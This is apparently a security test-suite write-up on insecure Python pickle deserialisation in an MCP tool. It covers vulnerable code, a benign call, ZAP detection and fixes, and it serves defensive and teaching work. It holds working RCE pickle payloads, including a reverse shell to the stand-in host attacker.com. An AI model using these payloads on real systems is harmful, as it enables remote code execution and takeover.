# Insecure Deserialization — CWE-502

## Description

`pickle.loads()` is called on attacker-controlled base64-encoded data.
Python's `pickle` format can encode arbitrary callables, including `os.system()`,
which execute when the object is deserialised. This provides unauthenticated
remote code execution with no further preconditions.

## Vulnerable Code

```python
# tools/deserial.py
raw = base64.b64decode(data)
obj = pickle.loads(raw)  # RCE if data is a malicious pickle
```

## Example MCP Call (benign — deserialises a plain dict)

```json
{
  "jsonrpc": "2.0",
  "method": "tools/call",
  "params": {
    "name": "load_object",
    "arguments": {"data": "gASVEgAAAAAAAAB9lIwDa2V5lIwFdmFsdWWUcy4="}
  },
  "id": 1
}
```

The base64 value `gASVEgAAAAAAAAB9lIwDa2V5lIwFdmFsdWWUcy4=` decodes to a pickled `{"key": "value"}` dict.

## Generating Payloads

### Safe test payload (serialised dict)

```python
import pickle, base64
payload = pickle.dumps({"key": "value"})
print(base64.b64encode(payload).decode())
```

### RCE payload — write output of `id` to /tmp/pwned

```python
import pickle, base64, os

class Exploit:
    def __reduce__(self):
        return (os.system, ('id > /tmp/pwned',))

payload = pickle.dumps(Exploit())
print(base64.b64encode(payload).decode())
```

### RCE payload — reverse shell

```python
class Exploit:
    def __reduce__(self):
        cmd = 'bash -i >& /dev/tcp/attacker.com/4444 0>&1'
        return (os.system, (cmd,))
```

## Expected Response

For a safe payload:
```
Deserialised (dict): {'key': 'value'}
```

For the RCE payload (os.system returns the exit code):
```
Deserialised (int): 0
```
Side effect: `/tmp/pwned` is created with the output of `id`.

## ZAP Detection

ZAP's deserialization scanner should detect:
- Crafted pickle payloads that trigger time-based delays (`time.sleep(5)`)
- Out-of-band callbacks via DNS/HTTP (using OAST integrations)

Note: detecting pickle RCE via response content alone is difficult — the response
looks identical to a safe deserialisation. Time-based or OOB detection is required.

## Secure Fix

Never deserialise untrusted data with `pickle`. Use a safe format:

```python
import json

def load_object(data: str) -> str:
    obj = json.loads(data)  # JSON only, no code execution possible
    return repr(obj)
```

If serialised objects are genuinely required, use HMAC signing:

```python
import hmac, hashlib, pickle

SECRET = b"signing_key_from_env"

def verify_and_load(signed_data: str) -> object:
    mac, _, payload = signed_data.partition(":")
    if not hmac.compare_digest(mac, hmac.new(SECRET, payload.encode(), hashlib.sha256).hexdigest()):
        raise ValueError("Invalid signature")
    return pickle.loads(bytes.fromhex(payload))
```
